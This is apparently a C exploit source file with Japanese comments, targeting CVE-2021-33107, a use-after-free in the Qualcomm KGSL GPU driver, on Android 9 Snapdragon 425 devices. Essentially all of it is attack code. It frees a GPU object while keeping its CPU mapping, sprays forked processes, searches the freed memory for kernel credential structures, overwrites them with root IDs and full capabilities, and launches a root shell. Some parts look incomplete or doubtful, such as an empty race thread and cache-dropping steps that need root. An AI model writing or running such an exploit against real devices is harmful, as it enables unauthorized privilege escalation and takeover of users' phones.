/*
 * CVE-2021-33107 (kgsl UAF) + fork spray
 * Android 9 / SD425 (Adreno 308, 32-bit GPU) 専用
 * - UAF領域をCPUから直接読み書き（GPUコマンド不要）
 * - 動的アドレス割り当て（MAP_FIXED不使用）
 * - 安定性重視
 *
 * コンパイル: clang -target aarch64-none-linux-android28 -O2 -fPIE -pie -pthread -o exploit exploit.c
 * または armv7a でも可（32bit CPU用）
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sched.h>
#include <sys/prctl.h>
#include <signal.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>
#include <asm/unistd.h>
#include <sys/wait.h>
#include <sys/select.h>
#include <poll.h>
#include <sys/stat.h>

/* ---------- KGSL ioctl definitions ---------- */
#define KGSL_IOC_TYPE 0x09

struct kgsl_gpuobj_alloc {
    uint64_t size;
    uint64_t flags;
    uint64_t va_len;
    uint64_t mmapsize;
    unsigned int id;
    unsigned int metadata_len;
    uint64_t metadata;
};
#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)

struct kgsl_gpuobj_free {
    uint64_t flags;
    uint64_t priv;
    unsigned int id;
    unsigned int type;
    unsigned int len;
    unsigned int __pad;
};
#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)

struct kgsl_gpuobj_info {
    uint64_t gpuaddr;
    uint64_t flags;
    uint64_t size;
    uint64_t va_len;
    uint64_t va_addr;
    unsigned int id;
};
#define IOCTL_KGSL_GPUOBJ_INFO _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)

/* flags */
#define KGSL_MEMFLAGS_USE_CPU_MAP      (1ULL << 28)
#define KGSL_CACHEMODE_SHIFT           26
#define KGSL_CACHEMODE_MASK            (0x0C000000ULL)
#define KGSL_CACHEMODE_WRITEBACK       3

/* ---------- エクスプロイトパラメータ ---------- */
#define UAF_SIZE        (4 * 1024 * 1024)       // 4MB (十分)
#define SPRAY_PIDS      2000
#define SCAN_WORDS      (UAF_SIZE / 4)

/* task_struct offsets (Linux 4.9/4.14) */
#define COMM_OFF        0x818
#define CRED_OFF        0x740
#define REAL_CRED_OFF   0x738

static int kgsl_fd = -1;
static volatile int race_done = 0;

static void die(const char *msg) {
    perror(msg);
    exit(EXIT_FAILURE);
}

/* ---------- KGSL ラッパー ---------- */
static int gpuobj_alloc(uint64_t size, uint64_t flags) {
    struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0)
        die("gpuobj_alloc");
    return a.id;
}

static void *gpuobj_mmap(size_t size, unsigned int id) {
    // MAP_FIXED は使わない → カーネルが適切なアドレスを選ぶ
    void *p = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED,
                   kgsl_fd, (off_t)id << 12);
    if (p == MAP_FAILED) die("gpuobj_mmap");
    return p;
}

static int gpuobj_info(unsigned int id, uint64_t *gpuaddr) {
    struct kgsl_gpuobj_info inf = { .id = id };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &inf) < 0)
        return -1;
    if (gpuaddr) *gpuaddr = inf.gpuaddr;
    return 0;
}

static void gpuobj_free(unsigned int id) {
    struct kgsl_gpuobj_free f = { .id = id };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0)
        die("gpuobj_free");
}

/* ---------- レーススレッド（不要になったが残しておく） ---------- */
static void *race_thread(void *arg) {
    // 何もしない（必要なら後で実装）
    return NULL;
}

/* ---------- main ---------- */
int main(int argc, char **argv) {
    setbuf(stdout, NULL);

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) die("open /dev/kgsl-3d0");
    printf("[+] kgsl fd = %d\n", kgsl_fd);

    /* ---- Phase 1: UAFバッファ確保 & CPUマッピング ---- */
    printf("[*] Phase 1: Allocate UAF buffer and mmap (no MAP_FIXED)\n");
    uint64_t flags = KGSL_MEMFLAGS_USE_CPU_MAP |
                     ((uint64_t)KGSL_CACHEMODE_WRITEBACK << KGSL_CACHEMODE_SHIFT);

    int uaf_id = gpuobj_alloc(UAF_SIZE, flags);
    void *uaf_m = gpuobj_mmap(UAF_SIZE, uaf_id);
    if (uaf_m == MAP_FAILED) die("uaf mmap");
    uint64_t uaf_base = (uint64_t)uaf_m;
    printf("[+] UAF mapped at 0x%lx (CPU VA)\n", (unsigned long)uaf_base);

    // GPUアドレスも取得（32bitで収まるはず）
    uint64_t gpu_addr = 0;
    if (gpuobj_info(uaf_id, &gpu_addr) == 0)
        printf("[+] GPU address = 0x%lx (should be < 0xFFFFFFFF)\n", (unsigned long)gpu_addr);

    /* ---- Phase 2: すぐにGPUオブジェクトを解放（CPUマッピングは残る） ---- */
    printf("[*] Phase 2: Free GPU object (keep CPU mapping)\n");
    gpuobj_free(uaf_id);
    printf("[+] GPU object freed, CPU mapping is now dangling\n");

    /* ---- Phase 3: ページ回収（解放されたページをカーネルに返させる） ---- */
    printf("[*] Phase 3: Reclaim pages (compact/drop caches)\n");
    int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
    if (rf >= 0) { write(rf, "1", 1); close(rf); }
    rf = open("/proc/sys/vm/drop_caches", O_WRONLY);
    if (rf >= 0) { write(rf, "3", 1); close(rf); }
    usleep(10000);

    /* ---- Phase 4: フォークスプレー（task_structを大量生成） ---- */
    printf("[*] Phase 4: Fork spray (%d children)\n", SPRAY_PIDS);
    int notify_pipe[2];
    if (pipe(notify_pipe) < 0) die("pipe");
    fcntl(notify_pipe[0], F_SETFD, FD_CLOEXEC);
    fcntl(notify_pipe[1], F_SETFD, FD_CLOEXEC);

    pid_t spray_pids[SPRAY_PIDS];
    int n_spray = 0;
    for (int i = 0; i < SPRAY_PIDS; i++) {
        pid_t p = fork();
        if (p == 0) {
            close(notify_pipe[0]);
            // 認識しやすい名前を設定
            prctl(PR_SET_NAME, "TASKUAF!!");
            // rootになったら通知する
            for (int j = 0; j < 1800; j++) {
                usleep(200000);
                if (getuid() == 0) {
                    usleep(50000);
                    pid_t me = getpid();
                    write(notify_pipe[1], &me, sizeof(me));
                    // シェル起動
                    execl("/system/bin/sh", "sh", NULL);
                    write(1, "sh exec failed\n", 15);
                    _exit(0);
                }
            }
            close(notify_pipe[1]);
            _exit(0);
        }
        if (p > 0) {
            spray_pids[n_spray++] = p;
        } else {
            break;
        }
    }
    close(notify_pipe[1]);
    printf("  Spawned %d children\n", n_spray);

    /* ---- Phase 5: UAF領域をCPUからスキャンしてtask_struct/credを探す ---- */
    printf("[*] Phase 5: CPU scan UAF range for task_struct\n");
    uint32_t *scan = (uint32_t *)uaf_base;
    int total_words = UAF_SIZE / 4;
    int found = 0;
    uint64_t found_cred_offset = 0;

    // マジック文字列 "TASKUAF!!" を探す (comm)
    for (int i = 0; i < total_words - 16; i++) {
        // commは0x818オフセットなので、そこから8文字 (2 words)
        if (scan[i] == 0x4B534154 && scan[i+1] == 0x21464155) { // "TASK" "UAF!"
            uint64_t comm_offset = (uint64_t)i * 4; // このページ内のオフセット
            // このページのベースアドレス
            uint64_t page_base = uaf_base + (i * 4 - COMM_OFF);
            // ページ内でcred構造体の位置を推測（COMM_OFFから逆算）
            uint64_t cred_guess = page_base + CRED_OFF;
            printf("[+] Found comm at offset 0x%lx (page base 0x%lx)\n",
                   (unsigned long)comm_offset, (unsigned long)page_base);
            // cred構造体の確認: uid/gidが同じか
            uint32_t *cred_ptr = (uint32_t *)(uaf_base + (cred_guess - uaf_base));
            uint32_t uid = cred_ptr[1];   // offset+4
            uint32_t gid = cred_ptr[2];   // offset+8
            uint32_t euid = cred_ptr[5];  // offset+20
            uint32_t egid = cred_ptr[6];  // offset+24
            if (uid == gid && uid == euid && uid == egid && uid > 1000 && uid < 20000) {
                printf("[+] Valid cred found at offset 0x%lx (uid=%u)\n",
                       (unsigned long)(cred_guess - uaf_base), uid);
                found_cred_offset = cred_guess - uaf_base;
                found = 1;
                break;
            }
        }
    }

    if (!found) {
        printf("[-] No cred found in UAF range\n");
    } else {
        /* ---- Phase 6: cred書き換え (uid=0, cap=full) ---- */
        printf("[*] Phase 6: Overwriting cred at offset 0x%lx\n",
               (unsigned long)found_cred_offset);
        uint32_t *cred = (uint32_t *)(uaf_base + found_cred_offset);
        cred[1] = 0; // uid
        cred[2] = 0; // gid
        cred[3] = 0; // suid
        cred[4] = 0; // sgid
        cred[5] = 0; // euid
        cred[6] = 0; // egid
        cred[7] = 0; // fsuid
        cred[8] = 0; // fsgid
        // cap: full
        cred[12] = 0xFFFFFFFF; cred[13] = 0x0000003F; // cap_permitted
        cred[14] = 0xFFFFFFFF; cred[15] = 0x0000003F; // cap_effective
        cred[16] = 0xFFFFFFFF; cred[17] = 0x0000003F; // cap_bset
        // securityポインタはそのまま
        __sync_synchronize();
        asm volatile("dsb sy" : : : "memory");
        printf("[+] Cred overwritten\n");
    }

    /* ---- Phase 7: 子プロセスからのroot通知を待つ ---- */
    printf("[*] Phase 7: Waiting for root notification...\n");
    struct pollfd pfd = { .fd = notify_pipe[0], .events = POLLIN };
    pid_t winner = 0;
    if (poll(&pfd, 1, 15000) > 0 &&
        read(notify_pipe[0], &winner, sizeof(winner)) == sizeof(winner)) {
        printf("[+] ROOT! PID = %d\n", winner);
        for (int i = 0; i < n_spray; i++)
            if (spray_pids[i] != winner) kill(spray_pids[i], SIGKILL);
        waitpid(winner, NULL, 0);
    } else {
        printf("[-] No child reported root\n");
    }

    /* ---- クリーンアップ ---- */
    close(kgsl_fd);
    for (int i = 0; i < n_spray; i++) kill(spray_pids[i], SIGKILL);
    while (wait(NULL) > 0);
    printf("[*] Done.\n");
    return 0;
}
